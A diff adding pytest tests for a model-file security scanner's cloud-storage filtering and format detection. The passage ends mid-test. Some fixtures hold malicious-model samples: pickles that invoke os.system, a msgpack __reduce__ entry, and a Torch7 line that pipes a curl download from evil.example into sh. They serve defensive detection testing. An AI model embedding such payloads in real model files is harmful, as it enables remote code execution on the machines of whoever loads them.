@@ -1,18 +1,30 @@
 import asyncio
+import io
 import json
 import logging
 import os
 import stat
+import struct
+import tarfile
+import zipfile
+from collections.abc import Callable
 from io import BytesIO
 from pathlib import Path
 from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
 
+from modelaudit.scanner_selection import (
+    resolve_scanner_selection_policy,
+    selected_scanner_extensions,
+    selected_scanner_filenames,
+)
+from modelaudit.utils.file.detection import _XML_MODEL_SIGNATURE_READ_BYTES, JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES
 from modelaudit.utils.helpers.retry import RetryError
 from modelaudit.utils.sources.cloud_storage import (
     GCSCache,
     _build_safe_local_path,
+    _filter_scannable_cloud_files,
     _run_coroutine_sync,
     analyze_cloud_target,
     download_from_cloud,
@@ -23,6 +35,7 @@ from modelaudit.utils.sources.cloud_storage import (
     redact_cloud_error_for_display,
     redact_url_for_display,
 )
+from tests.helpers import create_mock_coreml
 
 
 def make_fs_mock() -> MagicMock:
@@ -34,6 +47,65 @@ def make_fs_mock() -> MagicMock:
 
     fs.__exit__.side_effect = close_context
     return fs
+
+
+def configure_remote_open_payloads(fs: MagicMock, payloads: dict[str, bytes]) -> None:
+    def open_side_effect(path: str, _mode: str = "rb") -> io.BytesIO:
+        if path not in payloads:
+            raise FileNotFoundError(path)
+        return io.BytesIO(payloads[path])
+
+    fs.open.side_effect = open_side_effect
+
+
+class _CountingBytesIO(io.BytesIO):
+    def __init__(self, payload: bytes, byte_counter: list[int]):
+        super().__init__(payload)
+        self._byte_counter = byte_counter
+
+    def read(self, size: int | None = -1) -> bytes:
+        chunk = super().read(size)
+        self._byte_counter[0] += len(chunk)
+        return chunk
+
+
+def make_tar_payload() -> bytes:
+    payload = b'cos\nsystem\n(S"echo pwned"\ntR.'
+    output = io.BytesIO()
+    with tarfile.open(fileobj=output, mode="w") as archive:
+        info = tarfile.TarInfo("evil.pkl")
+        info.size = len(payload)
+        info.mtime = 0
+        archive.addfile(info, io.BytesIO(payload))
+    return output.getvalue()
+
+
+def make_zip_payload(entries: dict[str, bytes]) -> bytes:
+    output = io.BytesIO()
+    with zipfile.ZipFile(output, "w") as archive:
+        for name, payload in entries.items():
+            archive.writestr(zipfile.ZipInfo(name, date_time=(1980, 1, 1, 0, 0, 0)), payload)
+    return output.getvalue()
+
+
+def make_safetensors_payload() -> bytes:
+    header = json.dumps({"weight": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}).encode("utf-8")
+    return struct.pack("<Q", len(header)) + header + b"\x00" * 4
+
+
+def make_coreml_payload(tmp_path: Path) -> bytes:
+    return create_mock_coreml(tmp_path / "model.jpg").read_bytes()
+
+
+def make_executorch_payload() -> bytes:
+    return b"\x0c\x00\x00\x00ET12" + b"\x04\x00\x04\x00\x04\x00\x00\x00"
+
+
+def make_flax_msgpack_payload() -> bytes:
+    msgpack = pytest.importorskip("msgpack")
+    payload = msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
+    assert isinstance(payload, bytes)
+    return payload
 
 
 class _FailAfterPayload(BytesIO):
@@ -311,6 +383,774 @@ def test_filter_scannable_files_handles_signed_cloud_urls() -> None:
     assert filter_scannable_files(files) == files
 
 
+@pytest.mark.parametrize(
+    ("filename", "payload", "expected_format"),
+    [
+        pytest.param("evil.payload", b'cos\nsystem\n(S"echo pwned"\ntR.', "pickle", id="protocol0-pickle"),
+        pytest.param("archive.payload", make_tar_payload(), "tar", id="tar"),
+        pytest.param(
+            "model.payload",
+            make_zip_payload({"archive/data.pkl": b"payload", "archive/version": b"1"}),
+            "zip",
+            id="model-zip",
+        ),
+        pytest.param(
+            "keras.payload",
+            make_zip_payload(
+                {"config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode()}
+            ),
+            "zip",
+            id="config-only-keras-zip",
+        ),
+        pytest.param("weights.payload", make_safetensors_payload(), "safetensors", id="safetensors"),
+        pytest.param("cntk.payload", b"\x0a\x07version\x0a\x03uidCompositeFunction", "cntk", id="cntk"),
+        pytest.param(
+            "lightgbm.payload",
+            (
+                b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\n"
+                b"max_feature_idx=0\ntree=0\nnum_leaves=1\nsplit_feature=0\nleaf_value=0\n"
+            ),
+            "lightgbm",
+            id="lightgbm",
+        ),
+        pytest.param(
+            "mxnet.payload",
+            json.dumps(
+                {
+                    "nodes": [{"op": "Custom", "name": "load"}],
+                    "arg_nodes": [0],
+                    "heads": [[0, 0, 0]],
+                }
+            ).encode(),
+            "mxnet",
+            id="mxnet",
+        ),
+        pytest.param(
+            "pmml.payload",
+            b"<?xml version='1.0'?><!--" + (b"x" * (9 * 1024)) + b"--><PMML version='4.4'></PMML>",
+            "pmml",
+            id="late-pmml",
+        ),
+    ],
+)
+def test_filter_scannable_cloud_files_includes_content_routed_objects(
+    filename: str,
+    payload: bytes,
+    expected_format: str,
+) -> None:
+    url = f"s3://bucket/models/{filename}"
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+
+    files = [{"path": url, "name": filename, "size": len(payload), "human_size": f"{len(payload)} B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": expected_format}]
+
+
+@pytest.mark.parametrize(
+    ("selected_scanner", "expected"),
+    [
+        pytest.param("safetensors", True, id="matching-scanner"),
+        pytest.param("tflite", False, id="different-scanner"),
+    ],
+)
+def test_filter_scannable_cloud_files_honors_scanner_selection_for_content_routes(
+    selected_scanner: str,
+    expected: bool,
+) -> None:
+    url = "s3://bucket/models/weights.payload"
+    payload = make_safetensors_payload()
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    files = [{"path": url, "name": "weights.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]
+    scanner_policy = resolve_scanner_selection_policy(scanners=[selected_scanner])
+    scanner_selection = scanner_policy.to_config()
+
+    actual = _filter_scannable_cloud_files(
+        files,
+        fs=fs,
+        scannable_extensions=selected_scanner_extensions(scanner_policy, conservative=True),
+        scanner_selection=scanner_selection,
+    )
+
+    expected_files = [{**files[0], "content_detected_format": "safetensors"}] if expected else []
+    assert actual == expected_files
+
+
+def test_filter_scannable_cloud_files_includes_selected_exact_filename() -> None:
+    policy = resolve_scanner_selection_policy(scanners=["metadata"])
+    url = "s3://bucket/models/README"
+    files = [{"path": url, "name": "README", "size": 8, "human_size": "8 B"}]
+    fs = make_fs_mock()
+
+    actual = _filter_scannable_cloud_files(
+        files,
+        fs=fs,
+        scannable_extensions=selected_scanner_extensions(policy, conservative=True),
+        scannable_filenames=selected_scanner_filenames(policy, conservative=True),
+        scanner_selection=policy.to_config(),
+    )
+
+    assert actual == files
+    fs.open.assert_not_called()
+
+
+@pytest.mark.parametrize(
+    ("selected_scanner", "expected"),
+    [
+        pytest.param("pickle", [], id="reject-unselected-pytorch-zip"),
+        pytest.param("pytorch_zip", "routed", id="retain-selected-pytorch-zip"),
+    ],
+)
+def test_filter_scannable_cloud_files_validates_shared_suffix_ownership(
+    selected_scanner: str,
+    expected: list[dict[str, object]] | str,
+) -> None:
+    url = "s3://bucket/models/model.pt"
+    payload = make_zip_payload({"archive/data.pkl": b"N.", "archive/version": b"3"})
+    files = [{"path": url, "name": "model.pt", "size": len(payload), "human_size": "Unknown"}]
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    policy = resolve_scanner_selection_policy(scanners=[selected_scanner])
+
+    actual = _filter_scannable_cloud_files(
+        files,
+        fs=fs,
+        scannable_extensions=selected_scanner_extensions(policy, conservative=True),
+        scanner_selection=policy.to_config(),
+    )
+
+    if expected == "routed":
+        assert actual == [{**files[0], "content_detected_format": "zip"}]
+    else:
+        assert actual == expected
+    fs.open.assert_called()
+
+
+def test_filter_scannable_cloud_files_retains_inconclusive_shared_suffix() -> None:
+    url = "s3://bucket/models/model.pt"
+    payload = b"not a recognized model header"
+    files = [{"path": url, "name": "model.pt", "size": len(payload), "human_size": "Unknown"}]
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    policy = resolve_scanner_selection_policy(scanners=["pickle"])
+
+    actual = _filter_scannable_cloud_files(
+        files,
+        fs=fs,
+        scannable_extensions=selected_scanner_extensions(policy, conservative=True),
+        scanner_selection=policy.to_config(),
+    )
+
+    assert actual == files
+
+
+def test_filter_scannable_cloud_files_keeps_selected_joblib_without_content_probe() -> None:
+    url = "s3://bucket/models/model.joblib"
+    files = [{"path": url, "name": "model.joblib", "size": 8, "human_size": "8 B"}]
+    fs = make_fs_mock()
+    policy = resolve_scanner_selection_policy(scanners=["joblib"])
+
+    actual = _filter_scannable_cloud_files(
+        files,
+        fs=fs,
+        scannable_extensions=selected_scanner_extensions(policy, conservative=True),
+        scanner_selection=policy.to_config(),
+    )
+
+    assert actual == files
+    fs.open.assert_not_called()
+
+
+def test_filter_scannable_cloud_files_keeps_custom_extensions_suffix_only_without_selection() -> None:
+    url = "s3://bucket/models/weights.payload"
+    payload = make_safetensors_payload()
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    files = [{"path": url, "name": "weights.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs, scannable_extensions={".safetensors"}) == []
+    fs.open.assert_not_called()
+
+
+@pytest.mark.parametrize(
+    ("filename", "payload_factory", "expected_format"),
+    [
+        pytest.param(
+            "torch7.jpg",
+            lambda _tmp_path: (
+                b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+                b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+                b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+            ),
+            "torch7",
+            id="torch7",
+        ),
+        pytest.param("coreml.jpg", make_coreml_payload, "coreml", id="coreml"),
+        pytest.param("program.jpg", lambda _tmp_path: make_executorch_payload(), "executorch", id="executorch"),
+        pytest.param(
+            "llamafile.jpg",
+            lambda _tmp_path: b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n",
+            "llamafile",
+            id="llamafile",
+        ),
+        pytest.param("flax.jpg", lambda _tmp_path: make_flax_msgpack_payload(), "flax_msgpack", id="flax-msgpack"),
+    ],
+)
+def test_filter_scannable_cloud_files_matches_local_skip_filter_routes(
+    tmp_path: Path,
+    filename: str,
+    payload_factory: Callable[[Path], bytes],
+    expected_format: str,
+) -> None:
+    url = f"s3://bucket/models/{filename}"
+    payload = payload_factory(tmp_path)
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+
+    files = [{"path": url, "name": filename, "size": len(payload), "human_size": f"{len(payload)} B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": expected_format}]
+
+
+@pytest.mark.parametrize("reported_size", [0, 1])
+def test_filter_scannable_cloud_files_ignores_underreported_size(reported_size: int) -> None:
+    url = "s3://bucket/models/model.payload"
+    payload = b"\x08\x00\x00\x00TFL3" + b"\x00" * 16
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    files = [{"path": url, "name": "model.payload", "size": reported_size, "human_size": f"{reported_size} B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": "tflite"}]
+
+
+def test_filter_scannable_cloud_files_routes_within_tiny_sniff_budget() -> None:
+    url = "s3://bucket/models/model.payload"
+    payload = b"\x08\x00\x00\x00TFL3" + b"\x00" * 16
+    transferred = [0]
+    fs = make_fs_mock()
+    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
+    files = [{"path": url, "name": "model.payload", "size": 1, "human_size": "1 B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=8) == [
+        {**files[0], "content_detected_format": "tflite"}
+    ]
+    assert transferred == [8]
+
+
+def test_filter_scannable_cloud_files_skips_complete_benign_content_at_exact_sniff_budget() -> None:
+    url = "s3://bucket/models/preview.payload"
+    payload = b"\x89PNG\r\n\x1a\n"
+    transferred = [0]
+    fs = make_fs_mock()
+    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
+    files = [{"path": url, "name": "preview.payload", "size": len(payload), "human_size": "8 B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=len(payload)) == []
+    assert transferred == [len(payload)]
+
+
+def test_filter_scannable_cloud_files_caps_json_probe_at_shared_sniff_budget() -> None:
+    url = "s3://bucket/models/model.payload"
+    payload = b"{" + b" " * (64 * 1024)
+    transferred = [0]
+    fs = make_fs_mock()
+    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
+    files = [{"path": url, "name": "model.payload", "size": 1, "human_size": "1 B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=32) == [
+        {**files[0], "content_detected_format": "mxnet_symbol_routing_inconclusive"}
+    ]
+    assert transferred == [32]
+
+
+def test_filter_scannable_cloud_files_fails_closed_when_shared_sniff_budget_is_exhausted() -> None:
+    first_url = "s3://bucket/models/preview.png"
+    hidden_url = "s3://bucket/models/hidden.payload?X-Amz-Signature=secret"
+    payloads = {
+        first_url: b"\x89PNG\r\n\x1a\n",
+        hidden_url: b" " * (64 * 1024),
+    }
+    transferred = [0]
+    fs = make_fs_mock()
+    fs.open.side_effect = lambda path, _mode="rb": _CountingBytesIO(payloads[path], transferred)
+    files = [
+        {"path": first_url, "name": "preview.png", "size": 8, "human_size": "8 B"},
+        {"path": hidden_url, "name": "hidden.payload", "size": 1, "human_size": "1 B"},
+    ]
+
+    with pytest.raises(ValueError) as excinfo:
+        _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=32)
+
+    error = str(excinfo.value)
+    assert "maximum content inspection budget" in error
+    assert "hidden.payload" in error
+    assert "secret" not in error
+    assert transferred == [32]
+
+
+def test_filter_scannable_cloud_files_caps_zip_classification_at_sniff_budget() -> None:
+    url = "s3://bucket/models/archive.payload"
+    payload = make_zip_payload({"word/document.xml": b"<document />"})
+    transferred = [0]
+    fs = make_fs_mock()
+    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
+    files = [{"path": url, "name": "archive.payload", "size": 1, "human_size": "1 B"}]
+
+    with pytest.raises(ValueError, match="selective filtering incomplete"):
+        _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=16)
+
+    assert transferred == [16]
+
+
+def test_filter_scannable_cloud_files_reuses_complete_budgeted_zip_prefix() -> None:
+    url = "s3://bucket/models/archive.payload"
+    payload = make_zip_payload({"model.pkl": b"cos\nsystem\n(S'echo pwned'\ntR."})
+    transferred = [0]
+    fs = make_fs_mock()
+    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
+    files = [{"path": url, "name": "archive.payload", "size": 1, "human_size": "1 B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=len(payload)) == [
+        {**files[0], "content_detected_format": "zip"}
+    ]
+    assert transferred == [len(payload)]
+
+
+@pytest.mark.parametrize(
+    ("model_entry", "expected_format"),
+    [
+        pytest.param({"model.pkl": b"cos\nsystem\n(S'echo pwned'\ntR."}, "zip", id="model-bearing"),
+        pytest.param({}, None, id="benign"),
+    ],
+)
+def test_filter_scannable_cloud_files_reuses_partial_prefix_at_exact_zip_budget(
+    model_entry: dict[str, bytes],
+    expected_format: str | None,
+) -> None:
+    url = "s3://bucket/models/archive.payload"
+    payload = make_zip_payload(
+        {
+            **{f"docs/{index}.txt": b"benign text" for index in range(120)},
+            **model_entry,
+        }
+    )
+    transferred = [0]
+    fs = make_fs_mock()
+    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
+    files = [{"path": url, "name": "archive.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]
+
+    expected = [] if expected_format is None else [{**files[0], "content_detected_format": expected_format}]
+    assert _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=len(payload)) == expected
+    assert transferred[0] <= len(payload)
+
+
+def test_filter_scannable_cloud_files_handles_short_remote_reads() -> None:
+    class ShortReadBytesIO(io.BytesIO):
+        def read(self, size: int | None = -1) -> bytes:
+            return super().read(2 if size is None or size < 0 else min(size, 2))
+
+    url = "s3://bucket/models/model.payload"
+    payload = b"\x08\x00\x00\x00TFL3" + b"\x00" * 16
+    fs = make_fs_mock()
+    fs.open.side_effect = lambda _path, _mode="rb": ShortReadBytesIO(payload)
+    files = [{"path": url, "name": "model.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": "tflite"}]
+
+
+def test_filter_scannable_cloud_files_preserves_whitespace_prefixed_jax_json() -> None:
+    url = "s3://bucket/models/checkpoint.payload"
+    payload = (b" " * (9 * 1024)) + json.dumps({"framework": "jax", "orbax_version": "0.1.0"}).encode()
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    files = [{"path": url, "name": "checkpoint.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": "jax_checkpoint"}]
+
+
+def test_filter_scannable_cloud_files_preserves_jax_json_after_routing_budget() -> None:
+    url = "s3://bucket/models/checkpoint.payload"
+    payload = (b" " * (JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 1)) + json.dumps({"framework": "jax"}).encode()
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    files = [{"path": url, "name": "checkpoint.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": "jax_checkpoint"}]
+
+
+def test_filter_scannable_cloud_files_skips_complete_whitespace_content() -> None:
+    url = "s3://bucket/models/blank.payload"
+    payload = b" " * (9 * 1024)
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    files = [{"path": url, "name": "blank.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == []
+
+
+def test_filter_scannable_cloud_files_preserves_oversized_inconclusive_xml() -> None:
+    url = "s3://bucket/models/model.payload"
+    payload = (
+        b"<?xml version='1.0'?><!DOCTYPE PMML ["
+        + (b"x" * (_XML_MODEL_SIGNATURE_READ_BYTES + 64))
+        + b"]><PMML version='4.4'></PMML>"
+    )
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    files = [{"path": url, "name": "model.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == [
+        {**files[0], "content_detected_format": "xml_model_inconclusive"}
+    ]
+
+
+def test_filter_scannable_cloud_files_skips_complete_xml_probe_without_model_root() -> None:
+    url = "s3://bucket/models/notes.payload"
+    payload = (
+        b"<?xml version='1.0'?><!--"
+        + (b"x" * (_XML_MODEL_SIGNATURE_READ_BYTES - len(b"<?xml version='1.0'?><!--") - len(b"-->")))
+        + b"-->"
+    )
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    files = [{"path": url, "name": "notes.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]
+
+    assert len(payload) == _XML_MODEL_SIGNATURE_READ_BYTES
+    assert _filter_scannable_cloud_files(files, fs=fs) == []
+
+
+def test_filter_scannable_cloud_files_uses_actual_llamafile_size(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr("modelaudit.utils.sources.cloud_storage._CLOUD_CONTENT_SNIFF_BYTES", 16)
+    monkeypatch.setattr("modelaudit.utils.file.detection.LLAMAFILE_ROUTE_SCAN_BYTES", 64)
+    monkeypatch.setattr("modelaudit.utils.file.detection.LLAMAFILE_ROUTE_TAIL_SCAN_BYTES", 32)
+
+    url = "s3://bucket/models/runtime.payload"
+    payload = b"\x7fELF" + b"\x00" * 116 + b"llamafile"
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    files = [{"path": url, "name": "runtime.payload", "size": 65, "human_size": "65 B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": "llamafile"}]
+
+
+def test_filter_scannable_cloud_files_redacts_protocol_stripped_path_errors() -> None:
+    url = "bucket/models/evil.payload?X-Amz-Signature=secret"
+    fs = make_fs_mock()
+    fs.open.side_effect = PermissionError(f"denied {url}")
+    files = [{"path": url, "name": "evil.payload", "size": 8, "human_size": "8 B"}]
+
+    with pytest.raises(ValueError) as excinfo:
+        _filter_scannable_cloud_files(files, fs=fs)
+
+    error = str(excinfo.value)
+    assert "evil.payload" in error
+    assert "X-Amz-Signature=<redacted>" in error
+    assert "secret" not in error
+
+
+def test_filter_scannable_cloud_files_skips_benign_zip_content() -> None:
+    url = "s3://bucket/models/document.payload"
+    payload = make_zip_payload({"[Content_Types].xml": b"<Types />", "word/document.xml": b"<document />"})
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+
+    files = [{"path": url, "name": "document.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == []
+
+
+@pytest.mark.parametrize(
+    ("filename", "payload"),
+    [
+        pytest.param(
+            "settings.payload",
+            make_zip_payload(
+                {"config.json": json.dumps({"name": "not-a-keras-model", "config": {"theme": "light"}}).encode()}
+            ),
+            id="generic-config-zip",
+        ),
+        pytest.param("framing-only.payload", struct.pack("<Q", 4) + b"\x00" * 8, id="malformed-safetensors"),
+        pytest.param("cntk-notes.payload", b"\x0a\x07version\x0a\x03uid", id="cntk-near-match"),
+        pytest.param(
+            "lightgbm-notes.payload",
+            (
+                b"tree implementation notes\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\n"
+                b"max_feature_idx=0\nnum_leaves=1\nsplit_feature=0\nleaf_value=0\n"
+            ),
+            id="lightgbm-near-match",
+        ),
+        pytest.param(
+            "mxnet-notes.payload",
+            json.dumps({"nodes": [{"op": "Custom"}], "arg_nodes": [], "heads": [[0, 0, 0]]}).encode(),
+            id="mxnet-near-match",
+        ),
+        pytest.param(
+            "xml-notes.payload",
+            b"<?xml version='1.0'?><!--" + (b"x" * (9 * 1024)) + b"--><root />",
+            id="late-generic-xml",
+        ),
+        pytest.param(
+            "tool.jpg",
+            b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime",
+            id="generic-executable",
+        ),
+        pytest.param("program.jpg", b"\x0c\x00\x00\x00ETXX" + b"\x04\x00\x04\x00\x04\x00\x00\x00", id="executorch"),
+    ],
+)
+def test_filter_scannable_cloud_files_skips_benign_content_near_matches(
+    filename: str,
+    payload: bytes,
+) -> None:
+    url = f"s3://bucket/models/{filename}"
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+
+    files = [{"path": url, "name": filename, "size": len(payload), "human_size": f"{len(payload)} B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == []
+
+
+@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
+@patch("fsspec.filesystem")
+def test_download_from_cloud_selective_includes_content_routed_tflite(
+    mock_fs_class: MagicMock,
+    mock_analyze: AsyncMock,
+    tmp_path: Path,
+) -> None:
+    url = "s3://bucket/models/"
+    tflite_url = "s3://bucket/models/evil.payload"
+    tflite_payload = b"\x08\x00\x00\x00TFL3" + b"\x00" * 16
+    fs = make_fs_mock()
+    fs.info.return_value = {"type": "directory"}
+    fs.get.side_effect = lambda _src, dst: Path(dst).write_bytes(tflite_payload)
+    configure_remote_open_payloads(fs, {tflite_url: tflite_payload})
+    mock_fs_class.return_value = fs
+    mock_analyze.return_value = {
+        "type": "directory",
+        "file_count": 1,
+        "total_size": len(tflite_payload),
+        "human_size": "24 B",
+        "estimated_time": "instant",
+        "files": [
+            {
+                "path": tflite_url,
+                "name": "evil.payload",
+                "size": len(tflite_payload),
+                "human_size": "24 B",
+            }
+        ],
+    }
+
+    result = download_from_cloud(url, cache_dir=tmp_path, use_cache=False, show_progress=False)
+
+    assert isinstance(result, Path)
+    fs.open.assert_called_once_with(tflite_url, "rb")
+    fs.get.assert_called_once()
+    assert fs.get.call_args.args[0] == tflite_url
+
+
+@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
+@patch("fsspec.filesystem")
+def test_download_from_cloud_selective_skips_benign_unsupported_content(
+    mock_fs_class: MagicMock,
+    mock_analyze: AsyncMock,
+    tmp_path: Path,
+) -> None:
+    url = "s3://bucket/models/"
+    preview_url = "s3://bucket/models/preview.png"
+    preview_payload = b"\x89PNG\r\n\x1a\n" + b"\x00" * 16
+    fs = make_fs_mock()
+    fs.info.return_value = {"type": "directory"}
+    configure_remote_open_payloads(fs, {preview_url: preview_payload})
+    mock_fs_class.return_value = fs
+    mock_analyze.return_value = {
+        "type": "directory",
+        "file_count": 1,
+        "total_size": len(preview_payload),
+        "human_size": "24 B",
+        "estimated_time": "instant",
+        "files": [
+            {
+                "path": preview_url,
+                "name": "preview.png",
+                "size": len(preview_payload),
+                "human_size": "24 B",
+            }
+        ],
+    }
+
+    with pytest.raises(ValueError, match="No scannable model files found"):
+        download_from_cloud(url, cache_dir=tmp_path, use_cache=False, show_progress=False)
+
+    fs.open.assert_called_once_with(preview_url, "rb")
+    fs.get.assert_not_called()
+
+
+@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
+@patch("fsspec.filesystem")
+def test_download_from_cloud_selective_fails_closed_when_skipped_content_cannot_be_inspected(
+    mock_fs_class: MagicMock,
+    mock_analyze: AsyncMock,
+    tmp_path: Path,
+) -> None:
+    url = "s3://bucket/models/"
+    hidden_url = "s3://bucket/models/evil.payload?X-Amz-Signature=secret"
+    fs = make_fs_mock()
+    fs.info.return_value = {"type": "directory"}
+    fs.open.side_effect = PermissionError(f"denied {hidden_url}")
+    mock_fs_class.return_value = fs
+    mock_analyze.return_value = {
+        "type": "directory",
+        "file_count": 1,
+        "total_size": 8,
+        "human_size": "8 B",
+        "estimated_time": "instant",
+        "files": [{"path": hidden_url, "name": "evil.payload", "size": 8, "human_size": "8 B"}],
+    }
+
+    with pytest.raises(ValueError) as excinfo:
+        download_from_cloud(url, cache_dir=tmp_path, use_cache=False, show_progress=False)
+
+    error = str(excinfo.value)
+    assert "selective filtering incomplete" in error
+    assert "evil.payload" in error
+    assert "X-Amz-Signature" not in error
+    assert "secret" not in error
+    fs.get.assert_not_called()
+
+
+@pytest.mark.parametrize("streaming", [False, True])
+@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
+@patch("fsspec.filesystem")
+def test_selective_cloud_download_caps_content_sniffing_at_max_size(
+    mock_fs_class: MagicMock,
+    mock_analyze: AsyncMock,
+    tmp_path: Path,
+    streaming: bool,
+) -> None:
+    url = "s3://bucket/models/"
+    hidden_url = "s3://bucket/models/hidden.payload?X-Amz-Signature=secret"
+    payload = b" " * (64 * 1024)
+    transferred = [0]
+    fs = make_fs_mock()
+    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
+    mock_fs_class.return_value = fs
+    mock_analyze.return_value = {
+        "type": "directory",
+        "file_count": 1,
+        "total_size": 1,
+        "human_size": "1 B",
+        "estimated_time": "instant",
+        "files": [{"path": hidden_url, "name": "hidden.payload", "size": 1, "human_size": "1 B"}],
+    }
+
+    with pytest.raises(ValueError) as excinfo:
+        if streaming:
+            list(download_from_cloud_streaming(url, max_size=32, show_progress=False))
+        else:
+            download_from_cloud(
+                url,
+                cache_dir=tmp_path,
+                max_size=32,
+                use_cache=False,
+                show_progress=False,
+            )
+
+    error = str(excinfo.value)
+    assert "maximum content inspection budget" in error
+    assert "hidden.payload" in error
+    assert "secret" not in error
+    assert transferred == [32]
+    fs.get.assert_not_called()
+
+
+@pytest.mark.parametrize("streaming", [False, True])
+@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
+@patch("fsspec.filesystem")
+def test_selective_cloud_download_counts_content_probes_toward_total_budget(
+    mock_fs_class: MagicMock,
+    mock_analyze: AsyncMock,
+    tmp_path: Path,
+    streaming: bool,
+) -> None:
+    url = "s3://bucket/models/"
+    model_url = "s3://bucket/models/model.payload"
+    payload = b"\x08\x00\x00\x00TFL3" + b"\x00" * 16
+    fs = make_fs_mock()
+    fs.info.return_value = {"type": "file", "size": len(payload)}
+    configure_remote_open_payloads(fs, {model_url: payload})
+    mock_fs_class.return_value = fs
+    mock_analyze.return_value = {
+        "type": "directory",
+        "file_count": 1,
+        "total_size": len(payload),
+        "human_size": f"{len(payload)} B",
+        "estimated_time": "instant",
+        "files": [
+            {
+                "path": model_url,
+                "name": "model.payload",
+                "size": len(payload),
+                "human_size": f"{len(payload)} B",
+            }
+        ],
+    }
+
+    with pytest.raises(ValueError, match="exceeds maximum allowed size"):
+        if streaming:
+            list(download_from_cloud_streaming(url, max_size=(2 * len(payload)) - 1, show_progress=False))
+        else:
+            download_from_cloud(
+                url,
+                cache_dir=tmp_path,
+                max_size=(2 * len(payload)) - 1,
+                use_cache=False,
+                show_progress=False,
+            )
+
+    fs.open.assert_called_once_with(model_url, "rb")
+    fs.get.assert_not_called()
+
+
+@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
+@patch("fsspec.filesystem")
+def test_download_from_cloud_streaming_selective_includes_content_routed_tflite(
+    mock_fs_class: MagicMock,
+    mock_analyze: AsyncMock,
+) -> None:
+    url = "s3://bucket/models/"
